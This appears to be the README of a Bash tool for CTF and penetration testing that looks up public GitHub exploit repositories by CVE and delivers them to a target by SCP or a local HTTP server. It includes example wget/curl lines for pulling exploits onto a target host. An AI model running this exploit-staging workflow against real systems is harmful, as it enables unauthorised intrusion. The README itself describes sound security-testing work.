<div align="center">

<img src="https://img.shields.io/badge/bash-5.0%2B-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white"/>
<img src="https://img.shields.io/badge/platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black"/>
<img src="https://img.shields.io/badge/GitHub_API-v3-181717?style=for-the-badge&logo=github&logoColor=white"/>
<img src="https://img.shields.io/badge/use_case-CTF%20%2F%20PenTest-red?style=for-the-badge&logo=hackthebox&logoColor=white"/>

<br/><br/>

```
  ██████╗██╗   ██╗███████╗    ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗███████╗██████╗
 ██╔════╝██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║     ██║   ██║█████╗      ███████╗█████╗  ███████║██████╔╝██║     ███████║█████╗  ██████╔╝
 ██║     ╚██╗ ██╔╝██╔══╝      ╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║██╔══╝  ██╔══██╗
 ╚██████╗ ╚████╔╝ ███████╗    ███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║
  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
```

### *GitHub CVE Exploit Finder for CTF & Penetration Testing*

---

🇬🇧 English · 🇪🇸 [Español](./README_ES.md)

</div>

---

## 📖 What is this?

**GitHubSearchCVE** is a Bash script designed for CTF players and penetration testers. Given a CVE identifier, it queries the GitHub API, presents an **interactive list of repositories** sorted by stars, and lets you choose which exploits to download — then delivers them via direct download, SCP transfer to a target machine, or an instant Python HTTP server.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🔍 **Smart Search** | Queries GitHub API v3 filtered by CVE and language |
| ⭐ **Sorted by Stars** | Results ordered by community trust |
| 🖥️ **Interactive Selector** | Choose exactly which repos to download |
| 📦 **Auto Archive** | Clones and packages repos as `.tar.gz` |
| 📡 **3 Delivery Modes** | `Download`, `SCP`, or instant `HTTP` server |
| 🐍 **Python HTTP Server** | Portable file serving — no `nc` quirks |
| 🔑 **GitHub Token Support** | Avoid rate limiting (10 → 5000 req/min) |
| 📝 **Session Logging** | Timestamped log saved alongside your downloads |
| 🛡️ **Input Validation** | CVE format check + API error handling |

---

## ⚙️ Requirements

```bash
git · curl · jq · python3
```

On Debian/Ubuntu, install everything at once with `-z on` (requires root):

```bash
sudo ./GitHubSearchCVE.sh -z on -e CVE-2021-3156 -l Python -m Download
```

---

## 🚀 Usage

```bash
./GitHubSearchCVE.sh -e <CVE> -l <Language> -m <Mode> [options]
```

### Options

| Flag | Description | Required |
|------|-------------|----------|
| `-e` | CVE identifier — format: `CVE-YEAR-CODE` | ✅ Yes |
| `-l` | Language filter: `Python`, `Shell`, `C`, `Go`, `Java`, `PHP`… | ✅ Yes |
| `-m` | Delivery mode: `Download`, `SCP`, `HTTP` | ✅ Yes |
| `-n` | Max results to fetch (1–10, default: 10) | ❌ Optional |
| `-u` | SSH user for SCP mode | SCP only |
| `-t` | Target IP/host for SCP mode | SCP only |
| `-z` | Dependency check — use `-z on` to auto-install | ❌ Optional |
| `-h` | Show help | ❌ Optional |

> 💡 **Tip:** Set a `GITHUB_TOKEN` environment variable to bypass the 10 requests/min API rate limit.

---

## 📋 Examples

### Download mode — save exploits locally
```bash
./GitHubSearchCVE.sh -e CVE-2021-3156 -l Python -m Download
```

### HTTP mode — serve exploits to your target machine
```bash
./GitHubSearchCVE.sh -e CVE-2021-4034 -l C -m HTTP -n 5
```
Then on the target machine:
```bash
wget http://<your-ip>:8080/<exploit>.tar.gz
# or
curl -O http://<your-ip>:8080/<exploit>.tar.gz
```

### SCP mode — push directly to a target
```bash
./GitHubSearchCVE.sh -e CVE-2023-0386 -l C -m SCP -u kali -t 10.10.10.25
```

### With GitHub token (recommended)
```bash
export GITHUB_TOKEN="ghp_yourTokenHere"
./GitHubSearchCVE.sh -e CVE-2022-0847 -l C -m Download
```

---

## 🔄 Workflow

```
┌──────────────┐    ┌─────────────────┐    ┌──────────────────────┐
│  You run the │    │  GitHub API v3  │    │  Interactive list     │
│  script with │───▶│  returns repos  │───▶│  sorted by ⭐ stars   │
│  CVE + flags │    │  filtered by    │    │  with metadata        │
└──────────────┘    │  language       │    └──────────┬───────────┘
                    └─────────────────┘               │
                                                       ▼
                    ┌─────────────────┐    ┌──────────────────────┐
                    │  Delivered via  │    │  You pick which repos │
                    │  Download / SCP │◀───│  to clone & archive   │
                    │  / HTTP server  │    │  as .tar.gz           │
                    └─────────────────┘    └──────────────────────┘
```

---

## 📂 Output structure

```
/tmp/CVEDownloaded/
├── author1.tar.gz          ← cloned & archived repo
├── author2.tar.gz
└── session_20240315_1432.log   ← timestamped session log
```

---

## ⚠️ Disclaimer

> This tool is intended **exclusively for legal security research**, CTF competitions, and authorized penetration testing. The author is not responsible for any misuse. Always obtain proper authorization before testing systems you do not own.

---

<div align="center">

Made with 🖤 for the CTF & security community

</div>
